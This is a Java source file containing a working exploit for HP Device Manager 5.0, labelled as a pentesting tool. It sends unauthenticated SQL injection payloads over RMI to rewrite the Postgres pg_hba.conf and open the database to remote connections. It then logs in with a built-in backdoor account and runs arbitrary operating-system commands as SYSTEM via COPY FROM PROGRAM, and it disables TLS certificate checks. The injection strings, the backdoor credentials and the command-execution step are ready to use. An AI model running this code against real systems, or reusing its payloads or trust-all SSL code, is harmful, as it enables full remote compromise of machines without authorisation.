package nb.barmie.exploits.standalone;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.ArrayList;
import java.sql.ResultSet;
import java.sql.Statement;

import com.hp.hpdm.interf.ServiceInterf;
import com.hp.hpdm.mess.Message;
import com.hp.hpdm.mess.Request;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/***********************************************************
 * Exploit for HP Device Manager version 5.0 (tested
 * against 5.0.3620.38270). Exploits an unauthenticated SQL
 * injection in the RMI service to enable remote access to
 * the Postgres database allowing authentication via the
 * backdoor user account allowing operating system
 * commands to be executed under the context of the local
 * SYSTEM account.
 * 
 * Hat tip to these guys for their excellent PGSQL pwnage tips https://pulsesecurity.co.nz/articles/postgres-sqli
 * Also these for the HQL function calling pointer https://blog.h3xstream.com/2014/02/hql-for-pentesters.html
 * 
 * Blog post on the vuln discovery: https://nickbloor.co.uk/2020/10/05/hp-device-manager-cve-2020-6925-cve-2020-6926-cve-2020-6927/
 * 
 * Exploit for pentesting purposes produced by Nicky Bloor (@NickstaDB)
 **********************************************************/
public class HPDeviceManagerExploit {
	//Reference to the "HPDM Server RMI" object exposed by the HP Device Manager RMI service
	private static ServiceInterf svc;
	
	public static void main(String[] args) throws Exception {
		//Gimme a target
		if(args.length != 2) {
			System.out.println("Usage: HPDeviceManagerExploit <target-host> <command-to-run>\n");
			return;
		}
		System.out.println("Target: " + args[0] + "\nCommand: " + args[1] + "\n");
		
		//Setup a trust-all SSL context so that the HP Device Manager certificate is ignored when invoking remote methods
		initTrustAllSSL();
		
		//Get the object exposed by HPDM over RMI
		System.out.println("Requesting 'HPDM Server RMI' object over RMI on TCP port 1099...");
		Registry reg = LocateRegistry.getRegistry(args[0], 1099);
		svc = (ServiceInterf)reg.lookup("HPDM Server RMI");
		System.out.println("[+] Success.\n\nExploiting unauthenticated SQL injection to enable remote access to Postgres...");
		
		//Exploit an unauthenticated HQL/SQL injection to enable remote access to the Postgres service
		//First, we create a large object containing the new pg_hba.conf file we want to install
		goGoSQLi("x' and $$='$$=concat(chr(61),chr(39)) and 1=(select lo_from_bytea(1099666, $$\\x686F737420616C6C20616C6C203132372E302E302E312F3332206D64350D0A686F737420616C6C20616C6C203A3A312F313238206D64350D0A686F7374207265706C69636174696F6E20616C6C203132372E302E302E312F3332206D64350D0A686F7374207265706C69636174696F6E20616C6C203A3A312F313238206D64350D0A686F737420616C6C20616C6C20302E302E302E302F30206D6435$$)) and 1=1 -- ");
		System.out.println("[+] Uploaded new pg_hba.conf as a large object...");
		
		//Next, we write the large object above to disk, overwriting the existing pg_hba.conf file
		goGoSQLi("x' and $$='$$=concat(chr(61),chr(39)) and 1=(select lo_export(1099666,$$C:/Program Files/HP/HP Device Manager/Server/pgsql_10/data/pg_hba.conf$$)) and 1=1 -- ");
		System.out.println("[+] Dumped large object to pg_hba.conf on disk...");
		
		//Finally, we delete the large object and reload the Postgres config
		goGoSQLi("x' and $$='$$=concat(chr(61),chr(39)) and 1=(select lo_unlink(1099666)) and 1=1 -- ");
		goGoSQLi("x' and $$='$$=concat(chr(61),chr(39)) and 1=(select pg_typeof(pg_reload_conf())) and 1=1 -- ");
		System.out.println("[+] Reloaded Postgres configuration, remote connections are now accepted.\n");
		
		//Use the backdoor Postgres account to execute commands as SYSTEM
		//First, connect directly to the Postgres service using the built-in backdoor account
		System.out.println("Connecting to Postgres using the built-in backdoor user account.");
		Connection conn = DriverManager.getConnection("jdbc:postgresql://" + args[0] + ":40006/hpdmdb", "dm_postgres", " ");
		System.out.println("[+] Connected.\n\nExecuting command...");
		Statement stmt = conn.createStatement();
		
		//Next, create a table for our command output
		stmt.execute("CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text)");
		System.out.println("[+] Created temporary cmd_exec table to store command output in.");
		
		//Execute some command as SYSTEM and copy the output into the table we just created
		stmt.execute("COPY cmd_exec FROM PROGRAM '" + args[1] + "'");
		System.out.println("[+] Executed command '" + args[1] + "'.\n");
		
		//Get and display the output
		System.out.println("Command output:");
		ResultSet rs = stmt.executeQuery("SELECT * FROM cmd_exec");
		while(rs.next()) {
			System.out.println(rs.getString(1));
		}
		System.out.println("\nDone, cleaning up...");
		
		//Finally, clean up
		stmt.execute("DROP TABLE IF EXISTS cmd_exec");
		conn.close();
		System.out.println("[+] Deleted temporary cmd_exec table.");
	}
	
	//Exploit one of the SQL injections
	private static void goGoSQLi(String payload) throws Exception {
		Message msg = new Message();
		Request req = new Request();
		ArrayList<String> params = new ArrayList<String>();
		
		//Setup the message
		params.add(payload);
		req.setSeviceId(10552);
		req.setParams(params);
		msg.setRequest(req);
		
		//Send it
		Message res = svc.sendMessage(msg);
	}
	
	//Setup trust-all SSL context for RMI connection
	private static void initTrustAllSSL() throws Exception {
		TrustManager[] tm = new TrustManager[] { new X509TrustManager() {
			public X509Certificate[] getAcceptedIssuers() { return null; }
			public void checkClientTrusted(X509Certificate[] c, String t) {}
			public void checkServerTrusted(X509Certificate[] c, String t) {}
		}};
		
		SSLContext sc = SSLContext.getInstance("SSL");
		sc.init(null, tm, new SecureRandom());
		SSLContext.setDefault(sc);
	}
}
